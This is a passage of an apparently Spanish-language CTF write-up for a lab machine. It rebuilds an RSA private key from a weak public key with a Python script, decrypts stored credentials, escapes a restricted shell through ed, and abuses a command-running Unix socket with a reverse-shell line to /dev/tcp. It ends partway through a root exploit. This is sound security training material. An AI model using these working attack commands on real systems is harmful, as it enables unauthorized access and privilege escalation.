+<code><span class="p">x </span><span class="kd">=</span><span class="p"> (</span><span class="kd">-</span><span class="p">b </span><span class="kd">± √</span><span class="p">(b</span><span class="kd">^</span><span class="p">2 </span><span class="kd">-</span><span class="p"> 4ac)) </span><span class="kd">/</span><span class="p"> (2a)</span>
+</code></pre></div></div>
+
+<div><p>Recordar que b vale 1, y b^2 seria 1^2 que es 1, asi que representemos estos datos en la formula</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">x </span><span class="kd">=</span><span class="p"> (1 </span><span class="kd">± √</span><span class="p">(1 </span><span class="kd">-</span><span class="p"> 4ac)) </span><span class="kd">/</span><span class="p"> (2a)</span>
+</code></pre></div></div>
+
+<blockquote><strong><div><p>Adaptación de valores ... de nuevo</p></div></strong>
+<div><p>Repasemos que valores son equivalentes de la formula Bhaskara con nuestro caso<p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">x </span><span class="kd">=</span><span class="p"> q
+a </span><span class="kd">=</span><span class="p"> e
+c </span><span class="kd">=</span><span class="p"> kn</span>
+</code></pre></div></div></blockquote><br>
+
+<div><p>Al adaptar la función resolviendo la representación quedaria de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">=</span><span class="p"> (1 </span><span class="kd">± √</span><span class="p">(1 </span><span class="kd">+</span><span class="p"> 4ekn)) </span><span class="kd">/</span><span class="p"> (2e)</span>
+</code></pre></div></div>            
+
+<div><p>En este caso de criptografia no nos interesa un resultado negativo asi que cambiamos ± por +</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">=</span><span class="p"> (1 </span><span class="kd">+ √</span><span class="p">(1 </span><span class="kd">+</span><span class="p"> 4ekn)) </span><span class="kd">/</span><span class="p"> (2e)</span>
+</code></pre></div></div>            
+
+<div><p>En esta formula para conseguir q veamos que valores tenemos y cuales nos faltan</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">n     </span><span class="c1"># Lo obtenemos de la clave con python</span><span class="p">
+e     </span><span class="c1"># Lo obtenemos de la clave con python</span><span class="p">
+k     </span><span class="c1"># No lo tenemos, pero podemos aplicar fuerza bruta para conseguirlo</span>
+</code></pre></div></div>
+
+<div><p>Iniciamos un script, importamos tambien gmpy2 para jugar con iroot en la operación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">Crypto.PublicKey </span><span class="kd">import </span><span class="p">RSA
+</span><span class="kd">from </span><span class="p">gmpy2 </span><span class="kd">import </span><span class="p">iroot</span>
+</code></pre></div></div>
+
+<div><p>Agregamos el abrir la clave pública y extraer los valores de e y de n</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">Crypto.PublicKey </span><span class="kd">import </span><span class="p">RSA
+</span><span class="kd">from </span><span class="p">gmpy2 </span><span class="kd">import </span><span class="p">iroot
+
+file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"wh1tedrvg0n.pem"</span><span class="p">, </span><span class="s2">"r"</span><span class="p">)
+key </span><span class="kd">=</span><span class="p"> RSA.importKey(file.read())
+
+n </span><span class="kd">=</span><span class="p"> key.n
+e </span><span class="kd">=</span><span class="p"> key.e</span>
+</code></pre></div></div>
+
+<div><p>En la operación que tenemos para construir q no tenemos k, podemos bruteforcearlo del 1 al 100k para cuando se forme un cuadrado perfecto obtener k y definir el valor de q con la operación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">for </span><span class="p">k </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">1</span><span class="p">,</span><span class="na"> 100000</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> iroot(</span><span class="na">1</span><span class="kd"> +</span><span class="na"> 4</span><span class="kd"> *</span><span class="p"> e</span><span class="kd"> *</span><span class="p"> k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">1</span><span class="p">] </span><span class="kd">==</span><span class="na"> True</span><span class="p">:
+        q </span><span class="kd">=</span><span class="p"> (</span><span class="na">1</span><span class="kd"> +</span><span class="k"> int</span><span class="p">(iroot(</span><span class="na">1</span><span class="kd"> +</span><span class="na"> 4 </span><span class="kd">*</span><span class="p"> e </span><span class="kd">*</span><span class="p"> k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">0</span><span class="p">])) </span><span class="kd">//</span><span class="p"> (</span><span class="na">2</span><span class="kd"> *</span><span class="p"> e)</span>
+</code></pre></div></div>
+
+<div><p>Podemos agregar una validacion, si el resultado de n módulo de  q es igual a 0 q es correcto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">for </span><span class="p">k </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">1</span><span class="p">,</span><span class="na"> 100000</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> iroot(</span><span class="na">1</span><span class="kd"> +</span><span class="na"> 4</span><span class="kd"> *</span><span class="p"> e</span><span class="kd"> *</span><span class="p"> k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">1</span><span class="p">] </span><span class="kd">==</span><span class="na"> True</span><span class="p">:
+        q </span><span class="kd">=</span><span class="p"> (</span><span class="na">1</span><span class="kd"> +</span><span class="k"> int</span><span class="p">(iroot(</span><span class="na">1</span><span class="kd"> +</span><span class="na"> 4 </span><span class="kd">*</span><span class="p"> e </span><span class="kd">*</span><span class="p"> k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">0</span><span class="p">])) </span><span class="kd">//</span><span class="p"> (</span><span class="na">2</span><span class="kd"> *</span><span class="p"> e)
+        </span><span class="kd">if</span><span class="p"> n </span><span class="kd">%</span><span class="p"> q </span><span class="kd">==</span><span class="na"> 0</span><span class="p">:
+            </span><span class="kd">break</span>
+</code></pre></div></div>
+
+<div><p>Entonces, llegara un punto que tengamos q pero ¿y p?, simple p es la division de n sobre q</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">p </span><span class="kd">=</span><span class="p"> (n </span><span class="kd">//</span><span class="p"> q)</span>
+</code></pre></div></div>
+
+<div><p>Para construir la clave privada solo nos falta d, pero ¿que es e?, es el resultado de la función modular multiplicativa inversa de e y de m</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">d </span><span class="kd">=</span><span class="p"> modinv(e, m)</span>
+</code></pre></div></div>
+
+<div><p>No tenemos m pero en este punto podemos sacar n con la operacion n menos p mas q menos 1</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">m </span><span class="kd">=</span><span class="p"> n </span><span class="kd">-</span><span class="p"> (p </span><span class="kd">+</span><span class="p"> q </span><span class="kd">-</span><span class="na"> 1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>La funcion modular multiplicativa inversa no existe asi que la definimos en python</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">def </span><span class="k">egcd</span><span class="p">(</span><span class="no">a</span><span class="p">,</span><span class="no"> b</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> a </span><span class="kd">== </span><span class="na">0</span><span class="p">:
+        </span><span class="kd">return </span><span class="p">(b, </span><span class="na">0</span><span class="p">,</span><span class="na"> 1</span><span class="p">)
+    </span><span class="kd">else</span><span class="p">:
+        g, y, x </span><span class="kd">=</span><span class="p"> egcd(b </span><span class="kd">%</span><span class="p"> a, a)
+        </span><span class="kd">return</span><span class="p"> (g, x </span><span class="kd">-</span><span class="p"> (b </span><span class="kd">//</span><span class="p"> a) </span><span class="kd">*</span><span class="p"> y, y)
+
+</span><span class="kd">def </span><span class="k">modinv</span><span class="p">(</span><span class="no">a</span><span class="p">,</span><span class="no"> m</span><span class="p">):
+    g, x, y </span><span class="kd">=</span><span class="p"> egcd(</span><span class="no">a</span><span class="p">, </span><span class="no">m</span><span class="p">)
+    </span><span class="kd">if </span><span class="p">g </span><span class="kd">!=</span><span class="na"> 1</span><span class="p">:
+        </span><span class="kd">raise
+    else</span><span class="p">:
+        </span><span class="kd">return </span><span class="p">x </span><span class="kd">%</span><span class="p"> m</span>
+</code></pre></div></div>
+
+<div><p>Con todos estos valores podemos construir la clave privada y exportarla de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">key </span><span class="kd">=</span><span class="p"> RSA.construct((n, e, d, p, q))
+private </span><span class="kd">=</span><span class="p"> key.exportKey().decode()</span>
+</code></pre></div></div>
+
+<div><p>Una vez creada la guardamos en un archivo llamado private.key y la printeamos por pantalla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"private.key"</span><span class="p">,</span><span class="s2"> "w"</span><span class="p">)
+file.write(private)
+</span><span class="k">print</span><span class="p">(private)</span>
+</code></pre></div></div>
+
+<div><p>Nuestro script final para crear la clave privada al final quedaria de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">Crypto.PublicKey </span><span class="kd">import </span><span class="p">RSA
+</span><span class="kd">from </span><span class="p">gmpy2 </span><span class="kd">import </span><span class="p">iroot
+
+file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"wh1tedrvg0n.pem"</span><span class="p">,</span><span class="s2"> "r"</span><span class="p">)
+key </span><span class="kd">=</span><span class="p"> RSA.importKey(file.read())
+
+n </span><span class="kd">=</span><span class="p"> key.n
+e </span><span class="kd">=</span><span class="p"> key.e
+
+</span><span class="kd">for </span><span class="p">k </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="no">1</span><span class="p">,</span><span class="no"> 100000</span><span class="p">):
+    </span><span class="kd">if </span><span class="p">iroot(</span><span class="na">1</span><span class="kd"> + </span><span class="na">4 </span><span class="kd">*</span><span class="p"> e</span><span class="kd"> * </span><span class="p">k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">1</span><span class="p">] </span><span class="kd">==</span><span class="na"> True</span><span class="p">:
+        q </span><span class="kd">=</span><span class="p"> (</span><span class="na">1</span><span class="kd"> + </span><span class="k">int</span><span class="p">(iroot(</span><span class="na">1</span><span class="kd"> +</span><span class="na"> 4</span><span class="kd"> * </span><span class="p">e </span><span class="kd">*</span><span class="p"> k </span><span class="kd">*</span><span class="p"> n, </span><span class="na">2</span><span class="p">)[</span><span class="na">0</span><span class="p">])) </span><span class="kd">//</span><span class="p"> (</span><span class="na">2</span><span class="kd"> *</span><span class="p"> e)
+        </span><span class="kd">if</span><span class="p"> n </span><span class="kd">%</span><span class="p"> q </span><span class="kd">==</span><span class="na"> 0</span><span class="p">:
+            </span><span class="kd">break</span><span class="p">
+
+p </span><span class="kd">=</span><span class="p"> (n </span><span class="kd">//</span><span class="p"> q)
+
+m </span><span class="kd">=</span><span class="p"> n </span><span class="kd">-</span><span class="p"> (p </span><span class="kd">+</span><span class="p"> q </span><span class="kd">-</span><span class="na"> 1</span><span class="p">)
+
+</span><span class="kd">def</span><span class="k"> egcd</span><span class="p">(</span><span class="no">a</span><span class="p">,</span><span class="no"> b</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> a </span><span class="kd">==</span><span class="na"> 0</span><span class="p">:
+        </span><span class="kd">return </span><span class="p">(b, </span><span class="na">0</span><span class="p">, </span><span class="na">1</span><span class="p">)
+    </span><span class="kd">else</span><span class="p">:
+        g, y, x </span><span class="kd">=</span><span class="p"> egcd(b </span><span class="kd">%</span><span class="p"> a, a)
+        </span><span class="kd">return </span><span class="p">(g, x </span><span class="kd">-</span><span class="p"> (b </span><span class="kd">//</span><span class="p"> a) </span><span class="kd">*</span><span class="p"> y, y)
+
+</span><span class="kd">def </span><span class="k">modinv</span><span class="p">(</span><span class="no">a</span><span class="p">, </span><span class="no">m</span><span class="p">):
+    g, x, y </span><span class="kd">=</span><span class="p"> egcd(a, m)
+    </span><span class="kd">if </span><span class="p">g </span><span class="kd">!=</span><span class="na"> 1</span><span class="p">:
+        </span><span class="kd">raise
+    else</span><span class="p">:
+        </span><span class="kd">return </span><span class="p">x </span><span class="kd">%</span><span class="p"> m
+
+d </span><span class="kd">=</span><span class="p"> modinv(e, m)
+
+key </span><span class="kd">=</span><span class="p"> RSA.construct((n, e, d, p, q))
+private </span><span class="kd">=</span><span class="p"> key.exportKey().decode()
+
+file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"private.key"</span><span class="p">,</span><span class="s2"> "w"</span><span class="p">)
+file.write(private)
+</span><span class="k">print</span><span class="p">(private)</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar el script nos muestra la clave privada ademas de guardarla en private.key</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+-----BEGIN RSA PRIVATE KEY-----
+MIIEJgIBAAKCAQEAk20cqEqzhdLnNOpaPL9wsrQ2qAQV833B0GTtWJ8dqVMAsP4h
+rOShp14Mgwq7Mz6Z+BOxZhppWmWZ4ZJLAo8EJsLr7iWvSLK+hjaz23ENNZoG436T
+vCmBNN880JH7eIYQb/0DYgRNSqa473I88+4eD6PATfgYByLG7SsQvLv2FsEXYF0S
+W+WR9Nm3SsVpY0SPMgUfsld1K7h4xGck/lhg2/tA8nFtsH0OBb5EOC1+HeSMxHJI
+8xciQQndBwoKieWYqKD0r8ClL6MiVA1tCq3wcR9CsxXJNFWhntRr9eS4hi3mLXAE
+HXABaGwM+ptzWhegl+m5+gYFFTldVBrpsPvY0wIDAQABAoIBAEPGiMMxvICMafCg
+wKVm2Xe+c9YgMrtDGEQm8hqo4+kBGLNF0dN7NHoOObBQ0akIYZ5z5z1qbP668NiL
++eIOP7lWKULNnlzMl9x574u12H3I9tvFSEPbzOOysXGtey94arwhVFnOYn4sUZ77
+JNx7nuRPwsvVf65gJZXJE6PAwazJmGlNxw61DyrrRSgNhCs9JD6qyyxT+TiVghH7
+/l9OWDDKsdsIKULz+pTNezhh71bqE2vSt9dRlHrcMNrR9VvcTHxL0jUL2mwRZfJR
+VYD/pZ7yEu3HxmH+BO4RGWIE5tE5VGGyPGYtdL/0wQjjr6gSzXniFNnC2ZmSkcoI
+mNzaVoECgYEA69AyQ8y25KlEyzU2MIInlPQgZW8y2Ukjcw3QWMvSiEW9mYYr8sSD
+irxOvyg195b+s4y/UDDIo6u0CicRn5K0AjcovAKvDSd8SAWsqFa01I8cJw93Qty3
+6zVnPUj9ZZUlbsKev76YBmikF1alpCFL48/p43VgjVuSy2J7XzhdVRMCgYEAoAvu
+EZYfi5JW3pR+8u1jb/VBB5cxK8g4Bx6ZCatMeLDcvhYSPfKiVMb5q0PfXOtecv5T
+2llB09P1ne5mR6eKBPbq7q/jn0ntT/SJ+rbehGWc9eXJS9gB++GC8FVZplhTz5jH
+pdv10mOy+yQTyBHRMA0s8PP5U/eS6fctRLM8pUECgYEAhJeyS7El/Xi399LZv3jP
+rM+AD8jwvICFcEIKLoOcw4cDTvnEaGLa2/16Ab4oaij62hZ/1CU6C92WBEdnf2RL
+1xsQynZv22OiXBTkulrWntZBLC1kD7Jvr899V1ZdNOsh+x9vh70xWhkoev77cEhQ
+la3ogz8SpSkiZz3exPG6eQUCgYEAmLwp2xCoVBs42btfF1gisEKeZ68K1tyBU5II
+vGiEVx1529HWYNX/wuYMeDwSmmtoPFeoEFVj89JwsOJFK5agqbI2a8jhci8r0UTu
+tJv16OXMEALVwpKG+iixO8hIAO6ENTZ5OTib9Mb+lJtOYX1XZAL+44gBZfd7ddpU
+kh52/sECAwEAAQ==
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Con openssl y la clave privada podemos desencriptar en mensaje que tenemos de antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ openssl </span><span class="p">rsautl -decrypt -inkey private.key -in message.encrypted
+user: wh1tedrvg0n
+pass: LucK11Y0v!$</span>
+</code></pre></div></div>
+
+<div><p>Con las credenciales que nos da el mensaje nos podemos conectar por ssh y conseguimos shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">wh1tedrvg0n@127.0.0.1
+wh1tedrvg0n@127.0.0.1's password: </span><span class="kd">LucK11Y0v!$</span><span class="p">
+
+== NaughtyServer ==
+Welcome Wh1teDrvg0n!
+
+</span><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<blockquote><strong><div><p>¿Porqué conectarse a la 127.0.0.1?</p></div></strong>
+<div><p>Recordar que tenemos un tunel con socat de nuestro puerto 22 por TCP del localhost a el 22 por SCTP de la máquina victima<p></div></blockquote><br>
+
+<div><p>Cuando intentamos ejecutar comandos no podemos, ya que estamos en una limited shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+*** forbidden command: id
+</span><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+</span><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con el comando 'help' podemos listar los comandos a los que tenemos acceso en la lshell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$ help
+cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
+</span><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando el panel de ayuda de cat vemos que no es un cat si no el comando ed modificado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat --help
+GNU ed is a line-oriented text editor. It is used to create, display,
+modify and otherwise manipulate text files, both interactively and via
+shell scripts. A restricted version of ed, red, can only edit files in
+the current directory and cannot execute shell commands. Ed is the
+'standard' text editor in the sense that it is the original editor for
+Unix, and thus widely available. For most purposes, however, it is
+superseded by full-screen editors such as GNU Emacs or GNU Moe.
+
+Usage: ed [options] [file]
+
+Options:
+  -h, --help                 display this help and exit
+  -V, --version              output version information and exit
+  -E, --extended-regexp      use extended regular expressions
+  -G, --traditional          run in compatibility mode
+  -l, --loose-exit-status    exit with 0 status even if a command fails
+  -p, --prompt=STRING        use STRING as an interactive prompt
+  -r, --restricted           run in restricted mode
+  -s, --quiet, --silent      suppress diagnostics, byte counts and '!' prompt
+  -v, --verbose              be verbose; equivalent to the 'H' command
+
+Start edit by reading in 'file' if given.
+If 'file' begins with a '!', read output of shell command.
+
+Exit status: 0 for a normal exit, 1 for environmental problems (file
+not found, invalid flags, I/O errors, etc), 2 to indicate a corrupt or
+invalid input file, 3 for an internal consistency error (eg, bug) which
+caused ed to panic.
+
+Report bugs to bug-ed@gnu.org
+Ed home page: http://www.gnu.org/software/ed/ed.html
+General help using GNU software: http://www.gnu.org/gethelp
+</span><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En ed podemos ejecutar !bash y conseguir una bash real como wh1tedrvg0n</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat
+!bash
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
+wh1tedrvg0n
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.71 
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si vamos a el home de s4vitar podemos ver una contraseña work, dentro hay varios archivos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar</span><span class="p">$ ls
+user.txt  </span><span class="na">work</span><span class="p">
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar</span><span class="p">$ cd work
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ ls
+notes.txt  server.py  </span><span class="k">socket_test.s
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Vemos una nota de s4vitar que nos dice que no borremos archivos, que esta trabajando en algo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ cat notes.txt 
+I am currently working with Unix Socket files, please do not delete any of the
+temporary files you see created in this folder :)
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Tambien podemos ver un archivo unix socket file donde tenemos capacidad de escritura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ ls -l socket_test.s
+srwxrwxrwx 1 s4vitar s4vitar 0 Feb  2 22:45 </span><span class="k">socket_test.s</span><span class="p">
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Demosle un vistazo al archivo server.py para ver si hay una posible forma de escalar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ cat server.py 
+</span><span class="kd">import </span><span class="p">socket
+</span><span class="kd">import </span><span class="p">os, os.path
+</span><span class="kd">import </span><span class="p">time
+</span><span class="kd">from </span><span class="p">collections </span><span class="kd">import </span><span class="p">deque
+</span><span class="kd">import </span><span class="p">signal, sys
+
+</span><span class="kd">def </span><span class="k">def_handler</span><span class="p">(</span><span class="no">sig</span><span class="p">,</span><span class="no"> frame</span><span class="p">):
+	</span><span class="k">print</span><span class="p">(</span><span class="s2">"\n\n[!] Exiting...\n"</span><span class="p">)
+	os.remove(</span><span class="s2">"/home/s4vitar/work/socket_test.s"</span><span class="p">)
+	sys.exit(</span><span class="na">1</span><span class="p">)
+
+signal.signal(signal.SIGINT, def_handler)
+
+</span><span class="kd">def </span><span class="k">serverSocket</span><span class="p">():
+
+	server </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+	server.bind(</span><span class="s2">"/home/s4vitar/work/socket_test.s"</span><span class="p">)
+	os.system(</span><span class="s2">"chmod o+w /home/s4vitar/work/socket_test.s"</span><span class="p">)
+
+	</span><span class="kd">while </span><span class="na">True</span><span class="p">:
+		server.listen(</span><span class="na">1</span><span class="p">)
+		conn, addr </span><span class="kd">=</span><span class="p"> server.accept()
+		datagram </span><span class="kd">=</span><span class="p"> conn.recv(</span><span class="na">1024</span><span class="p">)
+
+		</span><span class="kd">if </span><span class="p">datagram:
+			</span><span class="k">print</span><span class="p">(datagram)
+			os.system(datagram)
+			conn.close()
+
+</span><span class="kd">def </span><span class="k">deleteSocket</span><span class="p">():
+
+	</span><span class="kd">if</span><span class="p"> os.path.exists(</span><span class="s2">"/home/s4vitar/work/socket_test.s"</span><span class="p">):
+		os.remove(</span><span class="s2">"/home/s4vitar/work/socket_test.s"</span><span class="p">)
+
+</span><span class="kd">if </span><span class="p">__name__ </span><span class="kd">==</span><span class="s2"> '__main__'</span><span class="p">:
+
+	deleteSocket()
+	serverSocket()
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>El script crea un socket usando el archivo .s, además le da permisos de escritura para todos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">server </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+server.bind(</span><span class="s2">"/home/s4vitar/work/socket_test.s"</span><span class="p">)
+os.system(</span><span class="s2">"chmod o+w /home/s4vitar/work/socket_test.s"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Se pone en escucha, lo que recibe lo almacena en una variable y lo ejecuta con os.system</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">while </span><span class="na">True</span><span class="p">:
+    server.listen(</span><span class="na">1</span><span class="p">)
+    conn, addr </span><span class="kd">=</span><span class="p"> server.accept()
+    datagram </span><span class="kd">=</span><span class="p"> conn.recv(</span><span class="na">1024</span><span class="p">)
+
+    </span><span class="kd">if</span><span class="p"> datagram:
+        </span><span class="k">print</span><span class="p">(datagram)
+        os.system(datagram)
+        conn.close()</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar con socat e intentar ejecutar el comando id, almacenando el output</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ socat - UNIX-CLIENT:socket_test.s
+id > /tmp/test
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el archivo donde guardamos el output podemos ver el comando id ejecutado como s4vitar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ cat /tmp/test
+uid=1001(s4vitar) gid=1001(s4vitar) groups=1001(s4vitar),27(sudo)
+</span><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>¿Que podemos hacer? conectarnos y enviarnos una shell, la recibimos como s4vitar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">wh1tedrvg0n@naughty</span><span class="p">:</span><span class="na">/home/s4vitar/work</span><span class="p">$ socat - UNIX-CLIENT:socket_test.s
+bash -c 'bash -i >& /dev/tcp/192.168.100.41/443 0>&1'</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.71
+</span><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~/work</span><span class="p">$ id
+uid=1001(s4vitar) gid=1001(s4vitar) groups=1001(s4vitar),27(sudo)
+</span><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~/work</span><span class="p">$ hostname -I
+192.168.100.71 
+</span><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~/work</span><span class="p">$ cat ~/user.txt
+2a3d0cd5deba375d0916194f935b553b
+</span><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~/work</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usando pspy como s4vitar podemos ver algunos procesos ejecutados como root algo interesantes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">CMD: UID=0     PID=31242  | su s4vitar 
+CMD: UID=0     PID=31266  | sudo whoami</span>
+</code></pre></div></div>
+
+<div><p>El usuario root ejecuta un 'su s4vitar' y como s4vitar ejecuta un simple 'sudo whoami'</p></div>
+<div><p>Hay un exploit creado por s4vitar (creador) que se aprovecha que el ptrace_scope este a 0, y asi es</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /proc/sys/kernel/yama/ptrace_scope
+0
+</span><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usamos el <a href="https://www.exploit-db.com/exploits/46989">exploit</a> ejecutandolo con bash y finalmente nos convertimos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">s4vitar@naughty</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash exploit.sh 
